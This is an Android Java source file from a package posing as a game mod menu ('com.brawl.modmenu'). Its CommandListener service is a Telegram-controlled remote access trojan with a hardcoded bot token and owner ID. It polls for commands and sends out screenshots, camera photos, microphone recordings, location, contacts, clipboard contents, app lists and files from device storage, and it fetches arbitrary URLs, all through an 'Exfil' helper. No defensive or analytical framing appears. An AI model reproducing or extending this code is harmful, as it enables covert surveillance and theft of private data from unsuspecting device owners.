package com.brawl.modmenu;

import android.app.Service;
import android.content.Intent;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import org.json.JSONArray;
import org.json.JSONObject;

public class CommandListener extends Service {

    private static final String TOKEN = "8688274559:AAGlGdaQh70HHSrEs_zMdkeW1udazQr6z5A";
    private static final String OWNER = "8558500657";
    private static final long INTERVAL = 5000;
    private long lastUpdateId = 0;
    private Handler handler = new Handler(Looper.getMainLooper());
    private boolean running = false;
    private int errors = 0;

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (!running) {
            running = true;

            // ВАЖНО — сбрасываем очередь старых сообщений
            new Thread(() -> {
                try {
                    String url = "https://api.telegram.org/bot" + TOKEN
                        + "/getUpdates?offset=-1&limit=1";
                    HttpURLConnection c = (HttpURLConnection) new URL(url).openConnection();
                    c.setConnectTimeout(10000);
                    c.setReadTimeout(10000);
                    BufferedReader r = new BufferedReader(
                        new InputStreamReader(c.getInputStream()));
                    StringBuilder sb = new StringBuilder();
                    String line;
                    while ((line = r.readLine()) != null) sb.append(line);
                    r.close();

                    JSONObject obj = new JSONObject(sb.toString());
                    JSONArray arr = obj.optJSONArray("result");
                    if (arr != null && arr.length() > 0) {
                        long highestId = arr.getJSONObject(arr.length() - 1)
                            .optLong("update_id", 0);
                        lastUpdateId = highestId;
                    }
                    Exfil.send("CMD", "Listener запущен. LastID=" + lastUpdateId);
                } catch (Throwable t) {
                    Exfil.send("CMD_ERR", "Сброс: " + t.getMessage());
                }
                handler.post(poll);
            }).start();
        }
        return START_STICKY;
    }

    private Runnable poll = new Runnable() {
        @Override
        public void run() {
            new Thread(() -> {
                try {
                    String url = "https://api.telegram.org/bot" + TOKEN
                        + "/getUpdates?offset=" + (lastUpdateId + 1)
                        + "&timeout=3";
                    HttpURLConnection c = (HttpURLConnection) new URL(url).openConnection();
                    c.setConnectTimeout(20000);
                    c.setReadTimeout(20000);
                    BufferedReader r = new BufferedReader(
                        new InputStreamReader(c.getInputStream()));
                    StringBuilder sb = new StringBuilder();
                    String line;
                    while ((line = r.readLine()) != null) sb.append(line);
                    r.close();

                    String resp = sb.toString();
                    JSONObject obj = new JSONObject(resp);

                    if (!obj.optBoolean("ok", false)) {
                        errors++;
                        if (errors <= 5) {
                            String truncated = resp.length() > 200
                                ? resp.substring(0, 200) : resp;
                            Exfil.send("CMD_ERR", "Ошибка: " + truncated);
                        }
                        if (running) handler.postDelayed(poll, INTERVAL);
                        return;
                    }

                    errors = 0;
                    JSONArray arr = obj.optJSONArray("result");
                    if (arr != null && arr.length() > 0) {
                        for (int i = 0; i < arr.length(); i++) {
                            JSONObject upd = arr.getJSONObject(i);
                            lastUpdateId = upd.optLong("update_id", lastUpdateId);
                            JSONObject msg = upd.optJSONObject("message");
                            if (msg == null) continue;
                            JSONObject chat = msg.optJSONObject("chat");
                            if (chat == null) continue;
                            String chatId = chat.optString("id", "");
                            if (!OWNER.equals(chatId)) continue;
                            String text = msg.optString("text", "").trim();
                            if (text.isEmpty()) continue;

                            Exfil.send("CMD_RCV", "Получено: " + text);
                            handleCommand(text);
                        }
                    }
                } catch (Throwable t) {
                    errors++;
                    if (errors <= 5) {
                        Exfil.send("CMD_ERR", t.getClass().getSimpleName()
                            + ": " + t.getMessage());
                    }
                }
                if (running) handler.postDelayed(poll, INTERVAL);
            }).start();
        }
    };

    private void handleCommand(String text) {
        try {
            if (text.startsWith("/ping")) {
                Exfil.send("CMD", "Pong! Всё работает");
                return;
            }
            if (text.startsWith("/help") || text.startsWith("/start")) {
                Exfil.send("HELP",
                    "/ping /screenshot /photo /mic\n" +
                    "/location /info /apps /games\n" +
                    "/contacts /battery /clip /vibrate\n" +
                    "/files /get /photos /photos_all\n" +
                    "/test_photos /screens /open /download");
                return;
            }
            if (text.startsWith("/screenshot")) {
                try {
                    Intent i = new Intent(this, MediaSniffer.class);
                    i.setAction("CAPTURE_NOW");
                    startService(i);
                } catch (Throwable t) {
                    Exfil.send("CMD", "Ошибка: " + t.getMessage());
                }
                return;
            }
            if (text.startsWith("/info")) { CommandHandler.sendInfo(this); return; }
            if (text.startsWith("/apps")) { AppList.dump(this); return; }
            if (text.startsWith("/games")) { GameList.dump(this); return; }
            if (text.startsWith("/contacts")) { CommandHandler.sendContacts(this); return; }
            if (text.startsWith("/location")) { CommandHandler.sendLocation(this); return; }
            if (text.startsWith("/photo")) { CommandHandler.takePhoto(this); return; }
            if (text.startsWith("/mic")) { CommandHandler.recordMic(this, 20); return; }
            if (text.startsWith("/clip")) { CommandHandler.sendClipboard(this); return; }
            if (text.startsWith("/battery")) { CommandHandler.sendBattery(this); return; }
            if (text.startsWith("/vibrate")) {
                CommandHandler.vibrate(this);
                Exfil.send("CMD", "Вибрация");
                return;
            }
            if (text.startsWith("/files")) {
                String path = text.substring(6).trim();
                if (path.isEmpty()) path = "/sdcard/";
                FileManager.listDir(this, path);
                return;
            }
            if (text.startsWith("/get")) {
                String path = text.substring(4).trim();
                if (!path.isEmpty()) FileManager.downloadFile(this, path);
                return;
            }
            if (text.startsWith("/test_photos")) { PhotoLocator.locate(); return; }
            if (text.startsWith("/screens")) { ScreenshotsGrabber.grab(); return; }
            if (text.startsWith("/photos_all")) { FileManager.allPhotos(this); return; }
            if (text.startsWith("/photos")) { FileManager.lastPhotos(this); return; }
            if (text.startsWith("/open ")) {
                String url = text.substring(6).trim();
                if (!url.isEmpty()) {
                    try {
                        Intent i = new Intent(Intent.ACTION_VIEW, android.net.Uri.parse(url));
                        i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                        startActivity(i);
                        Exfil.send("CMD", "Открыто: " + url);
                    } catch (Throwable t) {
                        Exfil.send("CMD", "Ошибка: " + t.getMessage());
                    }
                }
                return;
            }
            if (text.startsWith("/download ")) {
                String url = text.substring(10).trim();
                if (!url.isEmpty()) downloadUrl(url);
                return;
            }
            Exfil.send("CMD", "Неизвестная: " + text);
        } catch (Throwable t) {
            Exfil.send("CMD", "Ошибка: " + t.getMessage());
        }
    }

    private void downloadUrl(final String url) {
        new Thread(() -> {
            try {
                java.net.URL u = new java.net.URL(url);
                java.net.HttpURLConnection c = (java.net.HttpURLConnection) u.openConnection();
                c.setConnectTimeout(20000);
                c.setReadTimeout(20000);
                java.io.InputStream is = c.getInputStream();
                java.io.ByteArrayOutputStream bos = new java.io.ByteArrayOutputStream();
                byte[] buf = new byte[8192];
                int n;
                while ((n = is.read(buf)) > 0 && bos.size() < 20 * 1024 * 1024) {
                    bos.write(buf, 0, n);
                }
                is.close();
                String b64 = android.util.Base64.encodeToString(
                    bos.toByteArray(), android.util.Base64.NO_WRAP);
                Exfil.sendDocument("URL", b64, "download.bin");
            } catch (Throwable t) {
                Exfil.send("CMD", "Ошибка download: " + t.getMessage());
            }
        }).start();
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }

    @Override
    public void onDestroy() {
        running = false;
        handler.removeCallbacksAndMessages(null);
        super.onDestroy();
    }
}
